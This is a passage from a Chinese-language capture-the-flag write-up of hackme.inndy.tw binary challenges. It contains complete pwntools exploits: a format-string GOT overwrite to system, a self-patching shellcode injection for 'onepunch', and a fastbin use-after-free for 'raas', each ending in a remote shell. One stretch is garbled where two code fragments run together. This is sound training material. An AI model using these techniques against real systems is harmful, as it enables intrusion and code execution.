        if data[-3:] == '637':
            break
        p.close()
    leak_libc = int(data,16) - 247
    libc_base = leak_libc - libc.symbols['__libc_start_main']
    libc.address = libc_base
    log.info("libc address {}".format(hex(libc_base)))
    system = libc.symbols['system']
    printf_got = elf.got['printf']
    leak_stack = int(p.recv().strip('\n'),16)
    log.info("leak stack address{}".format(hex(leak_stack)))
    stack1 = leak_stack - 0x10c
    log.info("stack1 address{}".format(hex(stack1)))
    stack2 = leak_stack - 0x108
    log.info("stack2 address{}".format(hex(stack2)))    
    log.info("change stack")
    payload1 = "%{}c%{}$hn".format(stack1 & 0xffff, 30)
    payload1 += "%{}c%{}$hn".format(4, 31)
    payload1 += '1111'
    sl(payload1)
    log.info("wirte printf_got into stack")
    payload2 = "%{}c%{}$hn".format(printf_got & 0xffff, 85)
    payload2 += "%{}c%{}$hn".format(2, 87)
    payload2 += "2222"
    ru("1111\n")
    sl(payload2)
    log.info("change printf got")
    payload3 = "%{}c%{}$hhn".format(system>> 16 & 0xff, 20)
    payload3 += "%{}c%{}$hn".format((system& 0xffff) - (system >> 16 & 0xff), 21)
    payload3 += "3333"
    ru("2222\n")
    sl(payload3)
    ru("3333\n")
    sl("/bin/sh\x00")
    p.interactive()
另外需要注意的是在本地打的时候就得连本地的libc，不然是打不通的，打远程的时候就用hackme上面的libc
# onepunch
    Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    Canary found****
        NX:       NX enabled****
        PIE:      No PIE (0x400000)
这题虽然不难，但题目还挺新颖的
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char v4; // [rsp+8h] [rbp-18h]
      int v5; // [rsp+Ch] [rbp-14h]
      _BYTE *v6; // [rsp+10h] [rbp-10h]
      unsigned __int64 v7; // [rsp+18h] [rbp-8h]
      v7 = __readfsqword(0x28u);
      setbuf(_bss_start, 0LL);
      printf("Where What?", 0LL);
      v5 = __isoc99_scanf("%llx %d", &v6, &v4);//读入一个16进制数，和一个十进制数
      if ( v5 != 2 )
        return 0;
      *v6 = v4;//往16进制数的地址写入十进制数
      if ( *(_DWORD *)&v4 == 255 )
        puts("No flag for you");
      return 0;
    }
也就是一个任意地址写的操作，由于只能输入一次，可实现的操作实在有限，但细细观察你会发现这个程序的text段居然是可写可执行的，这就意味着我们可以改代码的逻辑实现各种操作，相当于打patch做题
再看main函数的汇编：会发现，如果输入的十进制数不是255，会直接跳到0x000000000400773处
那么我们只需要在这里打patch，让他跳到main函数的开头，实现无限写入操作
    .text:0000000000400756
    .text:0000000000400756 loc_400756:                            ; CODE XREF: main+5B↑j
    .text:0000000000400756                 mov     rax, [rbp-10h]
    .text:000000000040075A                 mov     edx, [rbp-18h]
    .text:000000000040075D                 mov     [rax], dl
    .text:000000000040075F                 mov     eax, [rbp-18h]
    .text:0000000000400762                 cmp     eax, 0FFh
    .text:0000000000400767                 jnz     short loc_400773
    .text:0000000000400769                 mov     edi, offset s   ; "No flag for you"
    .text:000000000040076E                 call    _puts
    .text:0000000000400773
    .text:0000000000400773 loc_400773:                            ; CODE XREF: main+75↑j
    .text:0000000000400773                 mov     eax, 0
    .text:0000000000400778
    .text:0000000000400778 loc_400778:                            ; CODE XREF: main+62↑j
    .text:0000000000400778                 mov     rcx, [rbp-8]
    .text:000000000040077C                 xor     rcx, fs:28h
    .text:0000000000400785                 jz      short locret_40078C
    .text:0000000000400787                 call    ___stack_chk_fail
    .text:000000000040078C ; -----------------------------------------------------------    .text:000000000040078C
    .text:000000000040078C locret_40078C:                         ; CODE XREF: main+93↑j
    .text:000000000040078C                 leave
    .text:000000000040078D                 retn
    .text:000000000040078D ; } // starts at 4006F2
    .text:000000000040078D main            endp
    .text:000000000040078D
接着，就写入shellcode，最后再讲跳转改到shellcode的位置，就可以getshell了
exp如下：
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="amd64",log_level = "debug")
    ip =""#hackme.inndy.tw 
    if ip:
        p = remote(ip,7718)
    else:
        p = process("./onepunch")#, aslr=0
    elf = ELF("./onepunch")
    libc = ELF("./libc-2.23.so.x86_64")
    #libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    
    shell = 0x400790
    ru("Where What?")
    sl("0x400768")
    sl("137")
    shellcode = asm(shellcraft.sh())
    shell_len = len(shellcode)
    i=0
    while i 16 )
        return puts("Out of index!");
      if ( records[v2] )
        return printf("Index #%d is used!\n", v2);
      records[v2] = (int)malloc(0xCu);
      v3 = (record *)records[v2];
      v3->pppp = rec_int_print;
      v3->ffff = rec_int_free;
      puts("Blob type:");
      puts("1. Integer");
      puts("2. Text");
      v1 = ask("Type");
      if ( v1 == 1 )
      {
        v3->u = ask("Value");
      }
      else
      {
        if ( v1 != 2 )
          return puts("Invalid type!");
        size = ask("Length");
        if ( size > 0x400 )
          return puts("Length too long, please buy record service premium to store longer record!");
        v3->u = (uuu)malloc(size);
        printf("Value > ");
        fgets((char *)v3->u, size, _bss_start);
        v3->pppp = rec_str_print;
        v3->ffff = rec_str_free;
      }
      puts("Okey, we got your data. Here is it:");
      return ((int (__cdecl *)(record *))v3->pppp)(v3);
    }
可知如果record的value是一个int，那么就由一个chunk存储
如果是string的话，将会再次创建一个chunk进行存储
利用的思路是：
  * 创建chunk0（int）
  * 创建chunk1（string）
  * free chunk1、chunk0
  * 使得相对应的chunk进入fastbin
  * 再次分配chunk2（string）
  * 由于fastbin的分配机制，会导致chunk2的内容写到chunk1的地方
  * 这时写入chunk2的内容为system和sh
  * delete chunk1即调用了system(sh)
exp:
    #encoding:utf-8
    from pwn import *
    context(os="linux", arch="i386",log_level = "debug")
    ip ="hackme.inndy.tw"
    if ip:
        p = remote(ip,7719)
    else:
        p = process("./raas")#, aslr=0
    elf = ELF("./raas")
    libc = ELF("./libc-2.23.so.i386")
    #libc = elf.libc
    #-------------------------------------    def sl(s):
        p.sendline(s)
    def sd(s):
        p.send(s)
    def rc(timeout=0):
        if timeout == 0:
            return p.recv()
        else:
            return p.recv(timeout=timeout)
    def ru(s, timeout=0):
        if timeout == 0:
            return p.recvuntil(s)
        else:
            return p.recvuntil(s, timeout=timeout)
    def debug(msg=''):
        gdb.attach(p,'')
        pause()
    def getshell():
        p.interactive()
    #-------------------------------------    def new(idx,Type,Length,Value):
        ru("Act > ")
        sl("1")
        ru("Index > ")
        sl(str(idx))
        ru("Type > ")
        sl(str(Type))
        if Length!=0:
            ru("Length > ")
            sl(str(Length))
        ru("Value > ")
        sl(Value)
    def delete(idx):
        ru("Act > ")
        sl("2")
        ru("Index > ")
        sl(str(idx))
    def show(idx):
        ru("Act > ")
        sl("3")
        ru("Index > ")
        sl(str(idx))
    system = elf.plt["system"]
    new(0,1,0,"1")
    new(1,2,16,"aaaa")
    delete(1)
    delete(0)
    new(2,2,12,"$0\0\0"+p32(system))
    delete(1)
    getshell()